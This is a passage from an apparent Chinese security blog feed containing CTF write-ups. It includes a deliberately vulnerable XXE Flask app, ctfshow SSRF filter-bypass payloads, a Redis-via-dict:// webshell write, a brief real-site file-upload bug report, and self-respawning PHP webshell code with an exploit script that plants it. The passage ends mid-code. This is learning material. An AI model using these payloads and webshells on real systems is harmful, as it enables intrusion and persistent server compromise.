class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">autor: c0ny1</span><br><span class="hljs-string">date: 2018-2-7</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;DEBUG&#x27;</span>] = <span class="hljs-literal">True</span><br><br>USERNAME = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-comment"># 账号</span><br>PASSWORD = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-comment"># 密码</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">home</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/doLogin&quot;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doLogin</span>():</span><br>    result = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 漏洞修复--禁用外部实体  resolve_entities=False</span><br>        <span class="hljs-comment">#tree = etree.fromstring(request.data,etree.XMLParser(resolve_entities=False))</span><br>        tree = etree.fromstring(request.data) <span class="hljs-comment"># 有漏洞</span><br>        <span class="hljs-comment"># 遍历xml结构内容</span><br>        <span class="hljs-keyword">for</span> childa <span class="hljs-keyword">in</span> tree:<br>            <span class="hljs-built_in">print</span>(childa.tag, childa.text, childa.attrib)<br>            <span class="hljs-keyword">if</span> childa.tag == <span class="hljs-string">&quot;username&quot;</span>:<br>                username = childa.text<br>                <span class="hljs-built_in">print</span>(username)<br>            <span class="hljs-keyword">if</span> childa.tag == <span class="hljs-string">&quot;password&quot;</span>:<br>                password = childa.text<br>                <span class="hljs-built_in">print</span>(password)<br>        <span class="hljs-keyword">if</span> username == USERNAME <span class="hljs-keyword">and</span> password == PASSWORD:<br>            result = <span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span> % (<span class="hljs-number">1</span>,username)<br>        <span class="hljs-keyword">else</span>:<br>            result = <span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span> % (<span class="hljs-number">0</span>,username)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> Ex:<br>        result = <span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span> % (<span class="hljs-number">3</span>,<span class="hljs-built_in">str</span>(Ex))<br>    <span class="hljs-keyword">return</span> result,&#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/xml;charset=UTF-8&#x27;</span>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prn_obj</span>(<span class="hljs-params">obj</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>.join([<span class="hljs-string">&#x27;%s:%s&#x27;</span> % item <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> obj.__dict__.items()]))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctfshow</tag>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>XXE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-ssrf-wp</title>
    <link href="/2022/08/12/blog0022-ctfshow-ssrf-wp/"/>
    <url>/2022/08/12/blog0022-ctfshow-ssrf-wp/</url>
    
    <content type="html"><![CDATA[<p>学习ssrf</p><span id="more"></span><h2 id="web351访问内网服务">web351（访问内网服务）</h2><p>先看PHP源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    error_reporting(<span class="hljs-number">0</span>);<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>    curl_close(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>没有任何的过滤，直接访问</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">url=https://127.1/flag.php<br></code></pre></td></tr></table></figure><p>获得flag</p><h2 id="web352简单过滤">web352（简单过滤）</h2><p>先看PHP源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    error_reporting(<span class="hljs-number">0</span>);<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;<br>            <span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>            <span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>            curl_close(<span class="hljs-variable">$ch</span>);<br>            <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>    &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>可以使用以下的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ip实际上是数字</span><br><span class="hljs-string">&quot;http://127.1/flag.php&quot;</span><br><span class="hljs-string">&quot;http://2130706433/flag.php&quot;</span><br><span class="hljs-string">&quot;http://0x7f000001/flag.php&quot;</span><br><span class="hljs-string">&quot;http://017700000001/flag.php&quot;</span><br><span class="hljs-string">&quot;http://017700000001/flag.php&quot;</span><br><span class="hljs-string">&quot;http://0/flag.php&quot;</span><br></code></pre></td></tr></table></figure><h2 id="web353简单过滤">web353（简单过滤）</h2><p>同web352</p><h2 id="web354域名解析302跳转">web354（域名解析/302跳转）</h2><p>这次过滤了数字0和数字1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    error_reporting(<span class="hljs-number">0</span>);<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/localhost|1|0|。/i&#x27;</span>))&#123;<br>            <span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>            <span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>            curl_close(<span class="hljs-variable">$ch</span>);<br>            <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>    &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这样的过滤，基本上直接利用ip的方向就比较困难，可以考虑使用短域名解析成127.0.0.1，从而实现一个内网的访问。</p><p>DNS解析trick：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http(s):<span class="hljs-regexp">//</span>sudo.cc --&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure><p>因此我们直接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]=<span class="hljs-string">&quot;http://sudo.cc/flag.php&quot;</span><br></code></pre></td></tr></table></figure><p>当然我们也可以在自己的vps上放置302跳转（当然对于本题，你的vps得买个域名）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="web355长度限制">web355（长度限制）</h2><p>同web352</p><h2 id="web356长度限制">web356（长度限制）</h2><p>同web352</p><h2 id="web357302跳转">web357（302跳转）</h2><p>同web354</p><h2 id="web358url解析">web358（url解析）</h2><p>先看PHP代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    error_reporting(<span class="hljs-number">0</span>);<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$url</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>有一个正则匹配，要求输入的url满足"http://ctf."开头，"show"结尾。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://username:password@hostname/path?arg=value#anchor&quot;</span>;<br>    print_r(parse_url(<span class="hljs-variable">$url</span>));<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Array</span><br><span class="hljs-comment">(</span><br><span class="hljs-comment">    [scheme] =&gt; http</span><br><span class="hljs-comment">    [host] =&gt; hostname</span><br><span class="hljs-comment">    [user] =&gt; username</span><br><span class="hljs-comment">    [pass] =&gt; password</span><br><span class="hljs-comment">    [path] =&gt; /path</span><br><span class="hljs-comment">    [query] =&gt; arg=value</span><br><span class="hljs-comment">    [fragment] =&gt; anchor</span><br><span class="hljs-comment">)</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>由此，我们可以利用url解析的漏洞拿到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;url=http://ctf.:123@127.0.0.1/flag.php?arg=.show&quot;</span><br></code></pre></td></tr></table></figure><h2 id="web359gopher打mysql">web359（gopher打mysql）</h2><p>主要是利用工具来打了，给了提示说打无密码的mysql</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812232408774.png" alt="image-20220812232408774" /></p><p>然后直接上传，注意需要二次url编码</p><p>因为此时GET会进行一次解码，然后curl中还会进行一次解码</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812232510290.png" alt="image-20220812232510290" /></p><h2 id="web360gopher打redis">web360（gopher打redis）</h2><p>这也可以利用工具来打</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812233607982.png" alt="image-20220812233607982" /></p><p>接下来就和上一题一样直接rce梭了。</p><p>不过作为练习，我们可以手动打一下尝试redis漏洞，利用dict协议探测6379端口发现存在未授权的redis服务。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812235327973.png" alt="image-20220812235327973" /></p><p>依次设置</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">?url=dict://127.0.0.1/config:set:dir:/var/www/html<br>?url=dict://127.0.0.1/set:shell:&quot;<span class="hljs-symbol">\u</span>003c<span class="hljs-symbol">\u</span>003f<span class="hljs-symbol">\u</span>0070<span class="hljs-symbol">\u</span>0068<span class="hljs-symbol">\u</span>0070<span class="hljs-symbol">\u</span>0020<span class="hljs-symbol">\u</span>0065<span class="hljs-symbol">\u</span>0076<span class="hljs-symbol">\u</span>0061<span class="hljs-symbol">\u</span>006c<span class="hljs-symbol">\u</span>0028<span class="hljs-symbol">\u</span>0024<span class="hljs-symbol">\u</span>005f<span class="hljs-symbol">\u</span>0050<span class="hljs-symbol">\u</span>004f<span class="hljs-symbol">\u</span>0053<span class="hljs-symbol">\u</span>0054<span class="hljs-symbol">\u</span>005b<span class="hljs-symbol">\u</span>0031<span class="hljs-symbol">\u</span>005d<span class="hljs-symbol">\u</span>0029<span class="hljs-symbol">\u</span>003b<span class="hljs-symbol">\u</span>0020<span class="hljs-symbol">\u</span>003f<span class="hljs-symbol">\u</span>003e&quot;<br>?url=dict://127.0.0.1/config:set:dbfilename:ssrf.php<br>?url=dict://127.0.0.1/save<br></code></pre></td></tr></table></figure><p>这直接将马写入了数据库再保存到php文件中解析</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220813000530136.png" alt="image-20220813000530136" /></p><p>顺利打出rce。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctfshow</tag>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>edusrc首次尝试——任意文件上传</title>
    <link href="/2022/07/11/blog0021-edusrc%E9%A6%96%E6%AC%A1%E5%B0%9D%E8%AF%95%E2%80%94%E2%80%94%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2022/07/11/blog0021-edusrc%E9%A6%96%E6%AC%A1%E5%B0%9D%E8%AF%95%E2%80%94%E2%80%94%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="文件上传">1、文件上传</h2><span id="more"></span><p>进入意见反馈/维修报修页面，发现可以存在图片上传控件。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0021/blog0021_0001.jpg" alt="img3" /></p><p>使用bp抓包修改文件名，绕过WAF</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0021/blog0021_0002.jpg" alt="img2" /></p><p>访问对应路径，实现文件解析。</p><p>由于是意见反馈和报修页面，因此可以实现XSS等。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0021/blog0021_0003.png" alt="img1" /></p>]]></content>
    
    
    <categories>
      
      <category>src</category>
      
      <category>edu</category>
      
    </categories>
    
    
    <tags>
      
      <tag>upload</tag>
      
      <tag>src</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-权限维持-wp</title>
    <link href="/2022/07/06/blog0020-ctfshow-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-wp/"/>
    <url>/2022/07/06/blog0020-ctfshow-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-wp/</url>
    
    <content type="html"><![CDATA[<p>开始学习权限维持啦<br /><span id="more"></span></p><h2 id="不死马的利用">1、不死马的利用</h2><p>先看源代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 题目说明：</span><br><span class="hljs-comment">// 想办法维持权限，确定无误后提交check，通过check后，才会生成flag，此前flag不存在</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br><br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$a</span>)&#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;cmd&#x27;</span>:<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;check&#x27;</span>:<br>        file_get_contents(<span class="hljs-string">&quot;http://checker/api/check&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;params not validate&#x27;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>简单测试之后，大致能够猜测到处理的原理，触发<code>check</code>之后会删除网站根目录下的文件。</p><p>这也要求我们把木马种进去，这里就引入不死马，不死马的木马文件如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    ignore_user_abort(<span class="hljs-literal">true</span>);<span class="hljs-comment">//用户断开继续运行</span><br>    set_time_limit(<span class="hljs-number">0</span>);<span class="hljs-comment">//不设置时间显示</span><br>    @unlink(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;.shell.php&quot;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[1]) == &quot;6f90524e863c9ac3577c4178697935ab&quot;)&#123;eval($_POST[2]);&#125;?&gt;&#x27;</span>;<br>    <span class="hljs-comment">//No hacker!</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>    &#123;<br>        file_put_contents(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        system(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .shell.php&#x27;</span>);<br>        usleep(<span class="hljs-number">5000</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当不死马触发之后，因为源代码已经被解析成了<code>opcode</code>，可以直接删除文件，同时不断生成不死马文件。</p><p>引入md5校验，是为了防止别人趁机骑马（这可不好</p><p>exp.py如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br>url = <span class="hljs-string">&quot;http://d0233dfd-df04-4d52-a182-8efba6dd398b.challenge.ctf.show/&quot;</span><br><br>params = &#123;<br>    <span class="hljs-string">&quot;action&quot;</span>:<span class="hljs-string">&quot;cmd&quot;</span><br>&#125;<br><br>file = <span class="hljs-string">&quot;.shell.php&quot;</span><br>content = base64.b64encode(<span class="hljs-string">&#x27;&#x27;&#x27;&lt;?php</span><br><span class="hljs-string">    ignore_user_abort(true);</span><br><span class="hljs-string">    set_time_limit(0);</span><br><span class="hljs-string">    @unlink(__FILE__);</span><br><span class="hljs-string">    $file = &quot;.shell.php&quot;;</span><br><span class="hljs-string">    $code = &#x27;&lt;?php if(md5($_POST[1]) == &quot;6f90524e863c9ac3577c4178697935ab&quot;)&#123;eval($_POST[2]);&#125;?&gt;&#x27;;</span><br><span class="hljs-string">    while(true)</span><br><span class="hljs-string">    &#123;</span><br><span class="hljs-string">        file_put_contents($file,$code);</span><br><span class="hljs-string">        system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .shell.php&#x27;);</span><br><span class="hljs-string">        usleep(5000);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">?&gt;&#x27;&#x27;&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>data = &#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;file_put_contents(&#x27;&#123;&#125;&#x27;,base64_decode(&#x27;&#123;&#125;&#x27;));&quot;</span>.<span class="hljs-built_in">format</span>(file,content)<br>&#125;<br><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>&#125;<br><br>times = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># 写木马</span><br>r = requests.post(url=url,params=params,data=data,proxies=proxies)<br><br><br>cmd = &#123;<br>    <span class="hljs-string">&quot;1&quot;</span>:<span class="hljs-string">&quot;whistleH&quot;</span>,<br>    <span class="hljs-string">&quot;2&quot;</span>:<span class="hljs-string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span><br>&#125;<br><br><span class="hljs-comment"># 触发check</span><br>params[<span class="hljs-string">&#x27;action&#x27;</span>] = <span class="hljs-string">&quot;check&quot;</span><br>r = requests.get(url=url,params=params)<br><br><span class="hljs-comment"># 运行木马</span><br>r = requests.post(url=url+<span class="hljs-string">&quot;.shell.php&quot;</span>,data=cmd)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>当然，如果在awd中我们被别人种下了不死马，最简单的方法就是重启机器或者重启服务。</p><p>如果上述的方法不合适，那么我们可以利用同样的原理，利用条件竞争污染木马。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    ignore_user_abort(<span class="hljs-literal">true</span>);<br>    set_time_limit(<span class="hljs-number">0</span>);<br>    @unlink(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;.shell.php&quot;</span>;<br>    <span 